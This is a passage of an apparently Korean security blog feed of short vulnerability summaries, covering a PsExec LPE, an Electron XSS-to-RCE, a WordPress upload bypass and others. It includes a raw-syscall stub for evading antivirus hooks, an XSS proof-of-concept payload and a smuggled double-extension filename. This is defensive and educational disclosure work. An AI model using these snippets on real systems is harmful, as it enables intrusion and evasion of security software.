&#xC788;&#xB2E4;.</p><pre><code class="hljs cpp">DWORD dwCode1 = <span class="hljs-number">0xb8d18b4c</span>;  DWORD dwCode2 = <span class="hljs-number">0x0000002a</span>; <span class="hljs-comment">// syscall code for NtUnmapViewOfSection</span>  DWORD dwCode3 = <span class="hljs-number">0x90c3050f</span>;  <span class="hljs-comment">// mov r10, rcx ; 0x4c 0x8b 0xd1</span>  <span class="hljs-comment">// mov eax, xxh ; 0xb8 xx 00 00 00</span>  <span class="hljs-comment">// syscall ; 0x0f 0x05</span>  <span class="hljs-comment">// retn ; 0xc3</span>  *(DWORD*)syscallbase = dwCode1;  *((DWORD*)syscallbase + <span class="hljs-number">1</span>) = dwCode2;  *((DWORD*)syscallbase + <span class="hljs-number">2</span>) = dwCode3;  p_SysUnmapViewOfSection sysUnmap = (p_SysUnmapViewOfSection)syscallbase;</code></pre><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; 64&#xBE44;&#xD2B8; ntdll&#xC5D0; &#xB300;&#xD574; NtUnmapViewOfSection&#xC758; &#xC9C1;&#xC811;&#xC801;&#xC778; system call &#xD6C4;&#xC5D0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xB294; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xC5C6;&#xB2E4;. &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xAC00; &#xC2DC;&#xB3C4;&#xD558;&#xACE0; hook &#xD558;&#xB294; user-mode&#xC5D0; &#xB0A8;&#xC740; &#xAC83;&#xC774; &#xC5C6;&#xB2E4;. &#xC8FC;&#xC785;&#xB41C; DLL&#xC774; unmap &#xB41C;&#xC9C0;&#xB294; &#xC624;&#xB798;&#xB410;&#xB2E4;.</p><p><img src="/2021/01/10/idioth/memfuck/image8.png" alt></p><p>&#xC5EC;&#xAE30;&#xBD80;&#xD130; Rtl* &#xD568;&#xC218; &#xC0AC;&#xC6A9; &#xC5C6;&#xC774; syscall&#xC744; &#xD1B5;&#xD574; &#xC9C1;&#xC811; code injection&#xC774;&#xB098; detected code&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xAC83;&#xC744; &#xD558;&#xBA74;&#xC11C; WoW64&#xC5D0; &#xAD00;&#xD574; &#xB9CE;&#xC740; &#xAC83;&#xC744; &#xBC30;&#xC6E0;&#xACE0;, &#xD55C;&#xACC4;&#xC810;&#xACFC; &#xD2B9;&#xC774;&#xC810;, 32&#xBE44;&#xD2B8;&#xC640; 64&#xBE44;&#xD2B8; VEH &#xAC19;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xD0D0;&#xAD6C; &#xC601;&#xC5ED;&#xC744; &#xC5BB;&#xC5C8;&#xB2E4;.</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><p><a href="https://github.com/jackullrich/memfuck">Github &#xC8FC;&#xC18C;</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
      <tag>idioth</tag>
      
      <tag>memfuck</tag>
      
      <tag>hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PsExec 0-day LPE non-official patch</title>
    <link href="/2021/01/09/fabu1ous/2021-01-09/"/>
    <url>/2021/01/09/fabu1ous/2021-01-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.0patch.com/2021/01/local-privilege-escalation-0day-in.html">LPE 0day in PsExec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows xp ~ Windows 10</p><p>PsExec v1.72</p><p>PsExec v2.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PsExec&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; System &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xC804;&#xD615;&#xC801;&#xC778; named pipe hijacking <a href="https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/">&#xCDE8;&#xC57D;&#xC810;</a>&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; PsExec&#xAC00; &#xAE30;&#xC874;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; named pipe&#xB97C; &#xC7AC;&#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xAD8C;&#xD55C; &#xC124;&#xC815;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; System&#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xB294; named pipe&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xACE0; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>0Patch&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xB97C; &#xACF5;&#xAC1C;&#xD558;&#xACE0; &#xBB34;&#xB8CC;&#xB85C; &#xBC30;&#xD3EC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. PsExec &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC6D0;&#xACA9; request&#xB97C; &#xBC1B;&#xC544; &#xCC98;&#xB9AC;&#xD558;&#xB294; thread&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; <code>CreateNamedPipe()</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. 0Patch&#xAC00; &#xACF5;&#xAC1C;&#xD55C; &#xD328;&#xCE58;&#xC5D0;&#xC120; <code>CreateNamedPipe()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xAE30; &#xC804; <code>FILE_FLAG_FIRST_PIPE_INSTANCE</code> &#xD50C;&#xB808;&#xADF8; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; <code>CreateNamedPipe()</code>&#xB97C; &#xD55C; &#xBC88; &#xB354; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; named pipe&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; named pipe&#xAC00; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xBA74; Psexesvc.exe&#xB97C; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p><a href="https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp">https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>named pipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-29669 : WIFI SD Hub Privilege Escalation Plugin</title>
    <link href="/2021/01/08/l0ch/2021-01-08/"/>
    <url>/2021/01/08/l0ch/2021-01-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/code-byter/CVE-2020-29669">https://github.com/code-byter/CVE-2020-29669</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Macally WIFISD2-2A82 Travel Router (&#xD38C;&#xC6E8;&#xC5B4; &#xBC84;&#xC804; : 2.000.010)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBB34;&#xC120; &#xBBF8;&#xB514;&#xC5B4; &#xACF5;&#xC720;&#xAC00; &#xAC00;&#xB2A5;&#xD55C; WIFI SD &#xD5C8;&#xBE0C;&#xC778; Macally WIFISD2-2A82 &#xC81C;&#xD488;&#xC5D0;&#xC11C; root&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xACF5;&#xACA9; &#xB2E8;&#xACC4;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD574;&#xCEE4;&#xB294; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xAC8C;&#xC2A4;&#xD2B8; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC7AC;&#xC124;&#xC815; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; admin&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB85C; &#xC124;&#xC815;&#xD560; &#xAC12;&#xC744; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</li><li>BurpSuite&#xB85C; &#xD574;&#xB2F9; &#xC694;&#xCCAD;&#xC5D0;&#xC11C; <code>name</code> &#xD544;&#xB4DC;&#xAC12;&#xC744; admin&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD574; &#xC694;&#xCCAD;&#xD558;&#xBA74; admin&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xAC00; &#xC7AC;&#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</li><li>telnet&#xC744; &#xD1B5;&#xD574; admin&#xACFC; &#xC7AC;&#xC124;&#xC815;&#xD55C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xD574; &#xC811;&#xC18D;&#xD558;&#xBA74; <code>/etc/passwd</code> &#xC758; root&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xBAA8;&#xB4E0; &#xACC4;&#xC815;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xD574;&#xC2DC;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xD574;&#xC2DC;&#xB97C; &#xD06C;&#xB798;&#xD0B9;&#xD574; root &#xC258;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>router</tag>
      
      <tag>L0ch</tag>
      
      <tag>wifi sd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] SoftMaker Office TextMaker에서 발견된 세 가지 취약점</title>
    <link href="/2021/01/07/idioth/2021-01-07/"/>
    <url>/2021/01/07/idioth/2021-01-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/01/vuln-spotlight-softmaker-office-textmaker-jan-2021.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+feedburner%2FTalos+%28Talos%E2%84%A2+Blog%29">Vulnerability Spotlight: Multiple vulnerabilities in SoftMaker Office TextMaker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SoftMaker Software GmbH SoftMaker Office TextMaker 2021, revision 1014</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SoftMaker Software GmbH&#xB294; &#xC624;&#xD53C;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xB294; &#xB3C5;&#xC77C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xD68C;&#xC0AC;&#xC785;&#xB2C8;&#xB2E4;. &#xD50C;&#xB798;&#xADF8;&#xC2ED; &#xC81C;&#xD488;&#xC778; SoftMaker Office&#xB294; &#xC6CC;&#xB4DC;, &#xC2A4;&#xD504;&#xB808;&#xB4DC; &#xC2DC;&#xD2B8;, &#xD504;&#xB808;&#xC820;&#xD14C;&#xC774;&#xC158;, &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB4F1;&#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; Office &#xC81C;&#xD488;&#xAD70;&#xC778; TextMaker&#xC758; document parsing &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; &#xC138; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2020-13544: Sign-extension</strong></p><p>document parser&#xAC00; record&#xB97C; parsing &#xD560; &#xB54C; index table record&#xB97C; 16bit unsigned &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC; &#xB8E8;&#xD504; &#xBB38;&#xC5D0;&#xC11C; index&#xB97C; &#xBE44;&#xAD50;&#xD560; &#xB54C; 16bit signed &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; index table record&#xC5D0; &#xC9C0;&#xC815;&#xB41C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xB9CE;&#xC740; &#xD69F;&#xC218;&#xB97C; &#xBC18;&#xBCF5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; index&#xB97C; &#xD1B5;&#xD574; heap &#xD560;&#xB2F9; &#xBC94;&#xC704; &#xBC16;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2020-13545: Integer conversion</strong></p><p>document parser&#xAC00; record&#xB97C; &#xC2A4;&#xCE94;&#xD558;&#xACE0; &#xC77D;&#xC5B4; &#xC62C; &#xB54C; &#xD30C;&#xC77C; &#xC2A4;&#xD2B8;&#xB9BC;&#xC758; &#xD604;&#xC7AC; &#xC704;&#xCE58;&#xC5D0;&#xC11C; record&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; 32bit integer&#xB97C; &#xC77D;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;. &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD560; &#xB54C; signed multiplication&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC; &#xBC84;&#xD37C;&#xC758; &#xB05D;&#xC744; &#xACC4;&#xC0B0;&#xD560; &#xB54C; unsigned multiplication&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; heap &#xD560;&#xB2F9; &#xBC94;&#xC704; &#xBC16;&#xC758; &#xC8FC;&#xC18C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2020-13546: Integer overflow</strong></p><p>document parser&#xAC00; record&#xB97C; parsing &#xD560; &#xB54C; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; 32&#xBE44;&#xD2B8; &#xAC12;&#xC744; &#xC77D;&#xC5B4; <code>0x23c</code>&#xB97C; &#xACF1;&#xD569;&#xB2C8;&#xB2E4;. &#xD53C;&#xC5F0;&#xC0B0;&#xC790;&#xB294; &#xCD5C;&#xB300; 10&#xBE44;&#xD2B8;&#xC774;&#xBBC0;&#xB85C; overflow &#xB418;&#xC5B4; 32&#xBE44;&#xD2B8;&#xB85C; &#xC798;&#xB824;&#xC11C; heap&#xC5D0; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xACF1;&#xC148; &#xD558;&#xAE30; &#xC804;&#xC758; &#xAC12;&#xC744; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD560;&#xB2F9;&#xB41C; &#xBC94;&#xC704; &#xBC16;&#xC5D0; &#xAC12;&#xC774; &#xC368;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC138; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810; &#xBAA8;&#xB450; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xD0C0;&#xAE43;&#xC774; &#xBB38;&#xC11C;&#xB97C; &#xC5F4;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>sign extension</tag>
      
      <tag>integer conversion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35717: RCE through XSS</title>
    <link href="/2021/01/06/fabu1ous/2021-01-06/"/>
    <url>/2021/01/06/fabu1ous/2021-01-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637">zonote RCE through XSS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>zonote &lt;= 0.4.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBB38;&#xC11C; &#xC791;&#xC131; Electron App&#xC778; zonote&#xC5D0;&#xC11C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. zonote &#xBB38;&#xC11C;&#xC5D0; &#xB9C8;&#xD06C;&#xB2E4;&#xC6B4;&#xACFC; html&#xC744; &#xC0BD;&#xC785;&#xD574; XSS(Cross-Site-Script) &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294;&#xB370; &#xC545;&#xC6A9; &#xBC94;&#xC704;&#xB97C; RCE&#xAE4C;&#xC9C0; &#xD655;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><blockquote><p>It is paramount that you do not enable Node.js integration in any renderer (<code>BrowserWindow</code>, <code>BrowserView</code>, or <code>&lt;webview&gt;</code>) that loads remote content.</p></blockquote><p><a href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electron&#xC758; &#xACF5;&#xC2DD;&#xBB38;&#xC11C;</a>&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC6D0;&#xACA9; &#xCF58;&#xD150;&#xCE20;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xBAA8;&#xB4E0; renderer&#xB294; Node.js intergration&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. XSS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD574;&#xB3C4; &#xADF8; &#xC545;&#xC6A9; &#xBC94;&#xC704;&#xB97C; renderer &#xB0B4;&#xBD80;&#xB85C; &#xC81C;&#xD55C;&#xD558;&#xAE30; &#xC704;&#xD574; Electron 5.0.0&#xBD80;&#xD130; &#xAD8C;&#xC7A5;&#xD574;&#xC628; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. </p><ul><li>&#xB2E4;&#xC74C;&#xC740; zonote&#xC758; main.js&#xCF54;&#xB4DC; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = {    ...    webPreference: {        nodeIntergration : <span class="hljs-literal">true</span>,        enableRemoteModule : <span class="hljs-literal">true</span>    }}</code></pre><p>Node.js intergration&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBBC0;&#xB85C; XSS&#xB97C; &#xD1B5;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>PoC</li></ul><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onemouseover</span>=<span class="hljs-string">&quot;</span></span></span><span class="xml">try{</span><span class="xml">const {shell} = require(&apos;electron&apos;);</span><span class="xml">shell.openExternal(&apos;file:C:/Windows/System32/calc.exe&apos;)</span><span class="xml">}catch(e){</span><span class="xml">console.error(e)</span><span class="xml">}&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35489 : Unrestricted File Upload Vulnerability in WordPress Plugin</title>
    <link href="/2021/01/05/l0ch/2021-01-05/"/>
    <url>/2021/01/05/l0ch/2021-01-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.wpsec.com/contact-form-7-vulnerability/">https://blog.wpsec.com/contact-form-7-vulnerability/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Contact Form &#x2264; 7 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC778; Contact Form 7&#xC740; &#xD3FC;&#xBA54;&#xC77C; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC73C;&#xB85C; &#xD3FC;&#xBA54;&#xC77C; &#xC591;&#xC2DD;&#xC744; &#xC27D;&#xAC8C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xC778;&#xAE30; &#xC788;&#xB294; &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC5D0;&#xC11C; &#xD5C8;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD655;&#xC7A5;&#xC790; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xC6B0;&#xD68C;&#xD574; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD574;&#xCEE4;&#xB294; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC774;&#xC911; &#xD655;&#xC7A5;&#xC790; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ex) <code>mal.php .jpg</code> (&#xACF5;&#xBC31;  = \t)</li><li>Contact Form 7&#xC740; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCCAB; &#xBC88;&#xC9F8; &#xD655;&#xC7A5;&#xC790; &#xC774;&#xD6C4; &#xAD6C;&#xBD84; &#xBB38;&#xC790;&#xB85C; &#xC778;&#xD574; &#xB450; &#xBC88;&#xC9F8; &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;.</li><li>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC740; <code>mal.php</code>&#xAC00; &#xB418;&#xACE0; &#xC5C5;&#xB85C;&#xB4DC;&#xC5D0; &#xC131;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xCEE4;&#xB294; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD1B5;&#xD574; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC; &#xBC0F; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC11C;&#xBC84;&#xC5D0; &#xC6F9;&#xC258;&#xACFC; &#xAC19;&#xC740; &#xD30C;&#xC77C;&#xC744; &#xC81C;&#xD55C; &#xC5C6;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/dn9uy3n/Check-WP-CVE-2020-35489">https://github.com/dn9uy3n/Check-WP-CVE-2020-35489</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>unrestricted file upload</tag>
      
      <tag>wordpress</tag>
      
      <tag>plugin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-29583: Zyxel 방화벽, VPN 제품에서 백도어 계정 발견</title>
    <link href="/2021/01/04/idioth/2021-01-04/"/>
    <url>/2021/01/04/idioth/2021-01-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/01/secret-backdoor-account-found-in.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+TheHackersNews+%28The+Hackers+News+-+Cyber+Security+Blog%29">Secret Backdoor Account Found in Several Zyxel Firewall, VPN Products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xBC29;&#xD654;&#xBCBD;<ul><li>ZLD V4.60 &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; ATP, USG, USG FLEX, VPN &#xC2DC;&#xB9AC;&#xC988;</li></ul></li><li>AP &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;<ul><li>NXC 2500, NXC5500</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zyxel&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; 